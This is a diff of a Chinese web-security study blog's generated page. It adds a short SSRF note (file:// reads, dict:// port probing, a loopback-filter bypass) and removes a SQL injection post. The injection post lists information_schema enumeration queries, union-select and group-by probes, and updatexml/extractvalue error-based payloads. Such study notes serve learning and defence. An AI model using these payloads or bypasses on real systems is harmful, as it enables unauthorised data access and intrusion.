+<h4><span id="利用">利用</span></h4><p>文件读取</p>
+<p><code>file:///path/to/file</code></p>
+<p>端口探测</p>
+<p><code>dict://host:ip</code></p>
+<h4><span id="防御">防御</span></h4><p>过滤恶意协议</p>
+<p>禁止访问内网ip</p>
+<h4><span id="绕过防御">绕过防御</span></h4><p>对于127.0.0.1</p>
+<p>使用127.1.1.1等类似ip绕过</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/16/day26_kls/" data-id="cm5vste520019friwbti5gqr2" data-title="day26_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/12/26/day34_kls/" data-id="cm6z08oqq001my1iwf2z0cpya" data-title="day34_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-day25_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/14/day25_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-14T14:34:50.000Z" itemprop="datePublished">2024-12-14</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/14/day25_kls/">day25_kls</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="sql注入">sql注入</span></h2><h3><span id="分类">分类</span></h3><p>依据获取信息的方式分类</p>
-<p>联合查询注入</p>
-<p>报错注入</p>
-<p>盲注</p>
-<p>布尔</p>
-<p>时间</p>
-<p>特殊注入</p>
-<p>宽字节注入</p>
-<p>二次编码注入</p>
-<p>二阶注入</p>
-<p>堆叠注入</p>
-<p>其他类型的注入</p>
-<p>值得注意的是，挖这一类要小心再小心，不然慧翅捞饭的</p>
-<p>insert</p>
-<p>update</p>
-<p>delete</p>
-<h3><span id="原因">原因</span></h3><p>用户可控的输入未经严格过滤拼接到了sql中，导致恶意sql被执行</p>
-<h3><span id="危害">危害</span></h3><p>信息泄漏</p>
-<p>信息篡改</p>
-<p>远程控制，木马</p>
-<h3><span id="挖掘">挖掘</span></h3><p>手动测试的一般步骤</p>
-<p>实现网站正常功能</p>
-<p>测试闭合符号</p>
-<p>注入</p>
-<p>报敏感信息</p>
-<h3><span id="利用">利用</span></h3><p>mysql</p>
-<p>元数据</p>
-<p>information_schema</p>
-<p>schmata</p>
-<p>schema_name数据库名</p>
-<p>tables</p>
-<p>table_name表名</p>
-<p>columns</p>
-<p>column_name列名</p>
-<p>数据库</p>
-<p>SELECT NULL, schema_name FROM information_schema.schemata–</p>
-<p>表名</p>
-<p>SELECT NULL, table_name FROM information_schema.tables WHERE table_schema &#x3D; ‘your_database_name’–</p>
-<p>列名</p>
-<p>SELECT NULL, column_name FROM information_schema.columns WHERE table_name &#x3D; ‘your_table_name’–</p>
-<p>查询注入点列数</p>
-<p>group by 2 –</p>
-<p>查找回显位</p>
-<p>union select 1,2,3,4</p>
-<p>常用函数</p>
-<p>USER()</p>
-<p>CONCAT()</p>
-<p>CURRENT_USER()</p>
-<p>VERSION()</p>
-<p>报错注入</p>
-<p>foor</p>
-<p>updatexml(1,concat(1,(sql)),1)</p>
-<p>extractvalue(0x0a,concat(0x0a,(sql)))</p>
-<p>盲注用</p>
-<p>SUBSTRING()</p>
-<p>LEFT()</p>
-<p>CHAR_LENGTH()</p>
-<p>LENGTH()</p>
-<p>ASCII()</p>
-<h3><span id="防御">防御</span></h3><p>白名单</p>
-<p>只允许用户传入变量为某些特定值，如只允许数字</p>
-<p>黑名单</p>
-<p>过滤恶意字符</p>
-<p>pdo预处理</p>
-<h3><span id="绕过防御">绕过防御</span></h3><p><a target="_blank" rel="noopener" href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/">SQL注入针对关键字过滤的绕过技巧 zu1k</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/14/day25_kls/" data-id="cm5vste510016friwf0cy4dv2" data-title="day25_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
 
     </footer>
   </div>
@@ -857,7 +848,7 @@
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -868,7 +859,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/changeme/">changeme</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exam/">exam</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/range/">range</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/changeme/">changeme</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exam/">exam</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/range/">range</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">奇技淫巧</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li></ul>
     </div>
   </div>
 
@@ -878,7 +869,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SqlInject/" rel="tag">SqlInject</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burpsuite/" rel="tag">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cdn/" rel="tag">cdn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cookie/" rel="tag">cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cors/" rel="tag">cors</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/" rel="tag">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker-compose/" rel="tag">docker-compose</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">fastjson反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/firewalld/" rel="tag">firewalld</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/get/" rel="tag">get</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/" rel="tag">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ip%E6%8E%A2%E6%B4%BB/" rel="tag">ip探活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" rel="tag">linux常见服务</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/post/" rel="tag">post</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/review/" rel="tag">review</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/selinux/" rel="tag">selinux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/session/" rel="tag">session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-copy-id/" rel="tag">ssh-copy-id</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sysinfo/" rel="tag">sysinfo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ufw/" rel="tag">ufw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virt-manager/" rel="tag">virt-manager</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9shell/" rel="tag">反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" rel="tag">指纹识别</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" rel="tag">站点架构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" rel="tag">端口扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" rel="tag">虚拟化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SqlInject/" rel="tag">SqlInject</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burp/" rel="tag">burp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burpsuite/" rel="tag">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cdn/" rel="tag">cdn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cookie/" rel="tag">cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cors/" rel="tag">cors</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/" rel="tag">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker-compose/" rel="tag">docker-compose</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">fastjson反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/firewalld/" rel="tag">firewalld</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/get/" rel="tag">get</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/" rel="tag">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ip%E6%8E%A2%E6%B4%BB/" rel="tag">ip探活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" rel="tag">linux常见服务</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/post/" rel="tag">post</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/review/" rel="tag">review</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/selinux/" rel="tag">selinux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/session/" rel="tag">session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-copy-id/" rel="tag">ssh-copy-id</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/struts2/" rel="tag">struts2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sysinfo/" rel="tag">sysinfo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ufw/" rel="tag">ufw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virt-manager/" rel="tag">virt-manager</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9shell/" rel="tag">反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/" rel="tag">小程序</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" rel="tag">指纹识别</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" rel="tag">站点架构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" rel="tag">端口扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" rel="tag">虚拟化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li></ul>
     </div>
   </div>
 
@@ -888,7 +879,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/SqlInject/" style="font-size: 10px;">SqlInject</a> <a href="/tags/blog/" style="font-size: 12.5px;">blog</a> <a href="/tags/burpsuite/" style="font-size: 12.5px;">burpsuite</a> <a href="/tags/cdn/" style="font-size: 10px;">cdn</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/cors/" style="font-size: 10px;">cors</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/docker-compose/" style="font-size: 12.5px;">docker-compose</a> <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">fastjson反序列化</a> <a href="/tags/firewalld/" style="font-size: 10px;">firewalld</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/get/" style="font-size: 10px;">get</a> <a href="/tags/http/" style="font-size: 12.5px;">http</a> <a href="/tags/iptables/" style="font-size: 10px;">iptables</a> <a href="/tags/ip%E6%8E%A2%E6%B4%BB/" style="font-size: 10px;">ip探活</a> <a href="/tags/kls/" style="font-size: 20px;">kls</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" style="font-size: 10px;">linux常见服务</a> <a href="/tags/post/" style="font-size: 10px;">post</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a> <a href="/tags/review/" style="font-size: 12.5px;">review</a> <a href="/tags/selinux/" style="font-size: 10px;">selinux</a> <a href="/tags/session/" style="font-size: 10px;">session</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/smb/" style="font-size: 10px;">smb</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 17.5px;">sql注入</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssh-copy-id/" style="font-size: 10px;">ssh-copy-id</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/sysinfo/" style="font-size: 10px;">sysinfo</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/ufw/" style="font-size: 10px;">ufw</a> <a href="/tags/virt-manager/" style="font-size: 10px;">virt-manager</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/xss/" style="font-size: 12.5px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 15px;">信息收集</a> <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" style="font-size: 10px;">指纹识别</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 15px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">暴力破解</a> <a href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" style="font-size: 10px;">站点架构</a> <a href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">端口扫描</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 10px;">虚拟化</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10px;">计算机网络</a>
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/SqlInject/" style="font-size: 10px;">SqlInject</a> <a href="/tags/blog/" style="font-size: 12px;">blog</a> <a href="/tags/burp/" style="font-size: 10px;">burp</a> <a href="/tags/burpsuite/" style="font-size: 12px;">burpsuite</a> <a href="/tags/cdn/" style="font-size: 10px;">cdn</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/cors/" style="font-size: 10px;">cors</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/docker/" style="font-size: 12px;">docker</a> <a href="/tags/docker-compose/" style="font-size: 12px;">docker-compose</a> <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">fastjson反序列化</a> <a href="/tags/firewalld/" style="font-size: 10px;">firewalld</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/get/" style="font-size: 10px;">get</a> <a href="/tags/http/" style="font-size: 12px;">http</a> <a href="/tags/iptables/" style="font-size: 10px;">iptables</a> <a href="/tags/ip%E6%8E%A2%E6%B4%BB/" style="font-size: 10px;">ip探活</a> <a href="/tags/kls/" style="font-size: 20px;">kls</a> <a href="/tags/linux/" style="font-size: 14px;">linux</a> <a href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" style="font-size: 10px;">linux常见服务</a> <a href="/tags/post/" style="font-size: 10px;">post</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a> <a href="/tags/review/" style="font-size: 12px;">review</a> <a href="/tags/selinux/" style="font-size: 10px;">selinux</a> <a href="/tags/session/" style="font-size: 10px;">session</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/smb/" style="font-size: 10px;">smb</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 16px;">sql注入</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssh-copy-id/" style="font-size: 10px;">ssh-copy-id</a> <a href="/tags/ssrf/" style="font-size: 12px;">ssrf</a> <a href="/tags/struts2/" style="font-size: 18px;">struts2</a> <a href="/tags/sysinfo/" style="font-size: 10px;">sysinfo</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/ufw/" style="font-size: 10px;">ufw</a> <a href="/tags/virt-manager/" style="font-size: 10px;">virt-manager</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/xss/" style="font-size: 12px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 14px;">信息收集</a> <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 10px;">小程序</a> <a href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" style="font-size: 10px;">指纹识别</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 14px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">暴力破解</a> <a href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" style="font-size: 10px;">站点架构</a> <a href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">端口扫描</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 10px;">虚拟化</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10px;">计算机网络</a>
     </div>
   </div>
 
@@ -897,7 +888,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
     </div>
   </div>
 
@@ -910,23 +901,23 @@
       <ul>
         
           <li>
-            <a href="/2025/01/16/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">fastjson反序列化</a>
+            <a href="/2025/02/11/linux%E4%B8%8B%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/">linux下微信小程序抓包</a>
           </li>
         
           <li>
-            <a href="/2025/01/13/SqlInject/">SqlInject</a>
+            <a href="/2025/02/10/linux%E4%B8%8B%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">linux下安卓渗透测试抓包环境配置</a>
           </li>
         
           <li>
